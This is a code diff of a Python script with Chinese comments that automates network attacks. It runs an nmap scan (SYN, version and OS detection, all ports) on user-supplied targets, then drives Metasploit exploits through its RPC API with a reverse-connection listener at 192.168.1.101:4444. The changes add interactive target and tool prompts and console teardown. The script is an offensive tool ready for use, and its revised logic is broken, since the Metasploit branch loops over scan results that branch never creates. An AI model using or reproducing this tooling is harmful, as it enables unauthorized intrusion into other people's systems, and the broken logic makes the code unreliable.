@@ -54,6 +54,10 @@ class MetasploitAPI:
         data = {'method': 'session.list'}
         return self._send_request(data)
 
+def get_targets_from_input():
+    targets = input("Enter the target(s) to scan (comma-separated or range): ")
+    return targets.strip()
+
 def scan_with_nmap(targets):
     nm = nmap.PortScanner()
     scan_arguments = '-sS -sV -O -p-'
@@ -107,32 +111,32 @@ def exploit_with_metasploit(api, target, lhost, lport):
     sessions = api.list_sessions()
     print('Sessions:', sessions)
 
+    # 销毁控制台
+    api.write_console(console_id, 'exit\n')
+    api.write_console(console_id, 'exit\n')  # 在某些情况下，需要两次退出命令
+
+def select_tool():
+    while True:
+        choice = input("Enter the tool to use (Nmap or Metasploit): ").lower()
+        if choice in ['nmap', 'metasploit']:
+            return choice
+        else:
+            print("Invalid choice. Please enter 'Nmap' or 'Metasploit'.")
+
 # 示例使用
-targets = '192.168.1.0/24'
+tool_choice = select_tool()
+targets = get_targets_from_input()
 lhost = '192.168.1.101'
 lport = 4444
 
-# Nmap 扫描
-nmap_results = scan_with_nmap(targets)
-print("Nmap Scan Results:", nmap_results)
+if tool_choice == 'nmap':
+    # Nmap 扫描
+    nmap_results = scan_with_nmap(targets)
+    print("Nmap Scan Results:", nmap_results)
+elif tool_choice == 'metasploit':
+    # Metasploit 利用
+    msf_api = MetasploitAPI(host='127.0.0.1', port=55553, username='msf', password='your_password')
+    for target in nmap_results:
+        exploit_with_metasploit(msf_api, target, lhost, lport)
 
-# Metasploit 利用
-msf_api = MetasploitAPI(host='127.0.0.1', port=55553, username='msf', password='your_password')
-for target in nmap_results:
-    exploit_with_metasploit(msf_api, target, lhost, lport)
 
-    
-    msf.call('console.destroy', [console_id])
-
-# 示例使用
-targets = '192.168.1.0/24'
-lhost = '192.168.1.101'
-lport = 4444
-
-# Nmap 扫描
-nmap_results = scan_with_nmap(targets)
-print("Nmap Scan Results:", nmap_results)
-
-# Metasploit 利用
-for target in nmap_results:
-    exploit_with_metasploit(target, lhost, lport)
